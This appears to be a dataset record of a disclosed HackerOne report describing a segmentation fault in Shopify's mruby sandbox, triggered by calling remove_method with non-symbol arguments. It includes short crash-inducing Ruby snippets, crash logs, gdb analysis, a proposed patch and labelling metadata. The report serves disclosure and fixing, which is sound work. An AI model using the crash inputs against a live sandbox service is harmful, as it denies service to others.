{
  "reported_to": "shopify-scripts",
  "reported_by": "jpenalbae ",
  "title": "SIGSEGV when invalid argument on remove_method",
  "content": "\nThere is an invalid memory read on mruby when calling to remove_method with invalid arguments which causes a SIGSEGV which leads into denial of service.\nSample\nThe following code tries to remove a method using a nil as argument\nCode 36 Bytes\n1class Child\n2   remove_method nil\n3end\nThere are many other variants, such as using a float, an integer, a string, a Class, etc... Which obviously are non valid method symbols.\nCode 104 Bytes\n1class Child\n2   remove_method 1\n3   remove_method 2.123\n4   remove_method 'aaaa'\n5   remove_method Child\n6end\nCrash\nHere we can see the crash (full crash output attached)\nCode 3.58 KiB\n1$ ruby bin/sandbox ../triage/uniq/min/segv/mrb_type > /tmp/full-crash.log\n2bin/sandbox:20: [BUG] Segmentation fault at 0x0000000000000e\n3ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]\n4\n5-- Control frame information -----------------------------------------------\n6c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\n7c:0002 p:0201 s:0005 E:001e48 EVAL   bin/sandbox:20 [FINISH]\n8c:0001 p:0000 s:0002 E:001e00 (none) [FINISH]\n9\n10-- Ruby level backtrace information ----------------------------------------\n11bin/sandbox:20:in `<main>'\n12bin/sandbox:20:in `sandbox_eval'\n13\n14-- Machine register context ------------------------------------------------\n15 RIP: 0x00007f8c4d77d554 RBP: 0x00007f8c4c2fe4e0 RSP: 0x00007f8c4c2fc898\n16 RAX: 0x000000000000008f RBX: 0x0000000000000006 RCX: 0x00007f8c4d7fbf83\n17 RDX: 0x000000000000008f RDI: 0x00007f8c4c2fe4e0 RSI: 0x0000000000000006\n18  R8: 0x00007f8c4d7f842f  R9: 0x00007f8c4c2fe010 R10: 0x0000000000000191\n19 R11: 0x00007f8c4d77d540 R12: 0x0000000000000010 R13: 0x000000000000008f\n20 R14: 0x00007f8c4c306160 R15: 0x00007f8c4c306100 EFL: 0x0000000000010246\n21\n22-- C level backtrace information -------------------------------------------\n23/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f8c51a96ea5]\n24/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f8c51a970dc]\n25/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f8c51971364]\n26/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f8c51a22dbe]\n27/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f8c516f5ed0]\n28/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_respond_to+0x14) [0x7f8c4d77d554] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/include/mruby/boxing_word.h:71\n29/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_check_convert_type+0x6b) [0x7f8c4d78c63b] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/object.c:310\n30/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_check_string_type+0x1c) [0x7f8c4d7897cc] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:1743\n31/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(join_ary+0xad) [0x7f8c4d78fe0d] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:1007\n32/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_ary_join+0x2e) [0x7f8c4d790dbe] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:1031\n33/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vformat+0x14b) [0x7f8c4d7a28cb] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/error.c:345\n34/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_name_error+0x92) [0x7f8c4d7a2ae2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/error.c:382\n35/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_mod_remove_method+0x137) [0x7f8c4d77c3c7] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1985\n36/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x762) [0x7f8c4d795cf2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n37/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f8c4d79b567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n38/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f8c4d76f173] ../../../../ext/mruby_engine/eval_monitored.c:68\n39/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f8c516ec464]\n40/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7f8c50a6830d]\n41\nCrash debug\nCode 740 Bytes\n1(gdb) r\n2Starting program: /usr/bin/ruby bin/sandbox /tmp/crasher.rb\n3[Thread debugging using libthread_db enabled]\n4Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n5[New Thread 0x7ffff7ff5700 (LWP 21707)]\n6[New Thread 0x7ffff2348700 (LWP 21758)]\n7\n8Program received signal SIGSEGV, Segmentation fault.\n9[Switching to Thread 0x7ffff2348700 (LWP 21758)]\n10mrb_class (v=..., mrb=mrb@entry=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/include/mruby/class.h:50\n1150          return mrb_obj_ptr(v)->c;\n12(gdb) x/1i $rip\n13=> 0x7ffff37c8554 <mrb_respond_to+20>:  mov    rsi,QWORD PTR [rsi+0x8]\n14(gdb) i r rsi\n15rsi            0x6      6\n16(gdb) x/1xg $rsi+0x8\n170xe:    Cannot access memory at address 0xe\nThe crash happens at ext/mruby_engine/mruby/include/mruby/class.h:50\nCode 561 Bytes\n1static inline struct RClass*\n2mrb_class(mrb_state *mrb, mrb_value v)\n3{\n4  switch (mrb_type(v)) {\n5  case MRB_TT_FALSE:\n6    if (mrb_fixnum(v))\n7      return mrb->false_class;\n8    return mrb->nil_class;\n9  case MRB_TT_TRUE:\n10    return mrb->true_class;\n11  case MRB_TT_SYMBOL:\n12    return mrb->symbol_class;\n13  case MRB_TT_FIXNUM:\n14    return mrb->fixnum_class;\n15  case MRB_TT_FLOAT:\n16    return mrb->float_class;\n17  case MRB_TT_CPTR:\n18    return mrb->object_class;\n19  case MRB_TT_ENV:\n20    return NULL;\n21  default:\n22    return mrb_obj_ptr(v)->c;  /* BUG: Bad memory access */\n23  }\n24}\nIf we check the vale v:\nCode 191 Bytes\n1(gdb) print v\n2$1 = {\n3  value = {\n4    p = 0x6,\n5    {\n6      i_flag = 0,\n7      i = 3\n8    },\n9    {\n10      sym_flag = 6,\n11      sym = 0\n12    },\n13    bp = 0x6,\n14    fp = 0x6,\n15    vp = 0x6\n16  },\n17  w = 6\n18}\nmrb_obj_ptr is the following macro\nCode 56 Bytes\n1#define mrb_obj_ptr(v)   ((struct RObject*)(mrb_ptr(v)))\nSo mrb_obj_ptr(v)->c would be equivalent to this:\nCode 136 Bytes\n1(gdb) print ((struct RObject*)v)->c\n2Cannot access memory at address 0xe\n3(gdb) print &((struct RObject*)v)->c\n4$2 = (struct RClass **) 0xe\nIf we check the backtrace:\nCode 2.85 KiB\n1(gdb) bt\n2#0  mrb_class (v=..., mrb=mrb@entry=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/include/mruby/class.h:50\n3#1  mrb_respond_to (mrb=mrb@entry=0x7ffff23494e0, obj=obj@entry=..., mid=mid@entry=143)\n4    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1492\n5#2  0x00007ffff37d763b in convert_type (raise=0 '\\000', method=0x7ffff384342f \"to_str\", tname=0x7ffff3844446 \"String\", val=..., mrb=0x7ffff23494e0)\n6    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/object.c:310\n7#3  mrb_check_convert_type (mrb=mrb@entry=0x7ffff23494e0, val=..., type=type@entry=MRB_TT_STRING, tname=tname@entry=0x7ffff3844446 \"String\",\n8    method=method@entry=0x7ffff384342f \"to_str\") at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/object.c:352\n9#4  0x00007ffff37d47cc in mrb_check_string_type (mrb=mrb@entry=0x7ffff23494e0, str=..., str@entry=...)\n10    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:1743\n11#5  0x00007ffff37dae0d in join_ary (mrb=mrb@entry=0x7ffff23494e0, ary=ary@entry=..., sep=sep@entry=..., list=...)\n12    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:1007\n13#6  0x00007ffff37dbdbe in mrb_ary_join (mrb=mrb@entry=0x7ffff23494e0, ary=ary@entry=..., sep=...)\n14    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:1031\n15#7  0x00007ffff37ed8cb in mrb_vformat (mrb=mrb@entry=0x7ffff23494e0, format=0x7ffff3843547 \"method '%S' not defined in %S\", ap=ap@entry=0x7ffff23479a8)\n16    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/error.c:345\n17#8  0x00007ffff37edae2 in mrb_name_error (mrb=mrb@entry=0x7ffff23494e0, id=id@entry=0, fmt=fmt@entry=0x7ffff3843547 \"method '%S' not defined in %S\")\n18    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/error.c:382\n19#9  0x00007ffff37c73c7 in remove_method (mid=0, mod=..., mrb=0x7ffff23494e0)\n20    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1985\n21#10 mrb_mod_remove_method (mrb=0x7ffff23494e0, mod=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:2006\n22#11 0x00007ffff37e0cf2 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=<optimized out>, proc@entry=0x7ffff2351520, pc=<optimized out>)\n23    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n24#12 0x00007ffff37e6567 in mrb_vm_run (mrb=0x7ffff23494e0, proc=0x7ffff2351520, self=..., stack_keep=stack_keep@entry=0)\n25    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n26#13 0x00007ffff37ba173 in mruby_engine_monitored_eval (data=0x7ffff23493e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n27#14 0x00007ffff7737464 in start_thread (arg=0x7ffff2348700) at pthread_create.c:333\n28#15 0x00007ffff6ab330d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109\n29(gdb)\nWe can see that whenever the desired method to delete is not found, mruby will raise an error. This is handled by remove_method() at ext/mruby_engine/mruby/src/class.c:1985:\nCode 485 Bytes\n1static void\n2remove_method(mrb_state *mrb, mrb_value mod, mrb_sym mid)\n3{\n4  struct RClass *c = mrb_class_ptr(mod);\n5  khash_t(mt) *h = find_origin(c)->mt;\n6  khiter_t k;\n7\n8  if (h) {\n9    k = kh_get(mt, mrb, h, mid);\n10    if (k != kh_end(h)) {\n11      kh_del(mt, mrb, h, k);\n12      mrb_funcall(mrb, mod, \"method_removed\", 1, mrb_symbol_value(mid));\n13      return;\n14    }\n15  }\n16\n17  mrb_name_error(mrb, mid, \"method '%S' not defined in %S\",\n18    mrb_sym2str(mrb, mid), mod);  /* <--- Raise an error */\n19}\nLater on, mruby tries to convert the symbol in order to print it which is what causes the crash.\nProposed fix\nAs the arguments for remove_method() should at least be a method type symbol. I propose the following check at mrb_mod_remove_method()\nCode 501 Bytes\ndiff --git a/src/class.c b/src/class.c\nindex 47a6c84..a898b46 100644\n--- a/src/class.c\n+++ b/src/class.c\n@@ -2003,6 +2003,11 @@ mrb_mod_remove_method(mrb_state *mrb, mrb_value mod)\n\n   mrb_get_args(mrb, \"*\", &argv, &argc);\n   while (argc--) {\n+\n+    /* Crash fix. Ignore invalid types */\n+    if ((!argv->value.sym) || (argv->value.sym_flag != MRB_SYMBOL_FLAG))\n+      mrb_raise(mrb, E_TYPE_ERROR, \"Invalid type for remove_method\");\n+\n     remove_method(mrb, mod, mrb_symbol(*argv));\n     argv++;\n   }\nmruby with the fix applied stops the crash:\nCode 168 Bytes\n1$ bin/sandbox /tmp/crasher.rb\n2bin/sandbox:20:in `sandbox_eval': Invalid type for remove_method (MRubyEngine::EngineRuntimeError)\n3        from bin/sandbox:20:in `<main>'\nImpact\nThis is not exploitable and its impact its limited to DoS of the service running the ruby sandbox.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1481959800,
  "report_url": "https://hackerone.com/reports/181874",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a Ruby class and use remove_method with invalid arguments (nil, integer, float, string, Class)"
    ],
    [
      2,
      "Observe the segmentation fault (SIGSEGV) when mruby attempts to process these invalid arguments"
    ]
  ],
  "vuln_description": "The vulnerability is a segmentation fault in mruby when remove_method is called with invalid arguments (non-symbol types). This occurs because the code attempts to dereference memory when processing error messages for invalid method names without proper type checking, leading to a denial of service.",
  "reason": "The vulnerability is straightforward to discover as it only requires testing edge cases (invalid argument types) for a single method call. No complex interactions or state manipulation is required.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}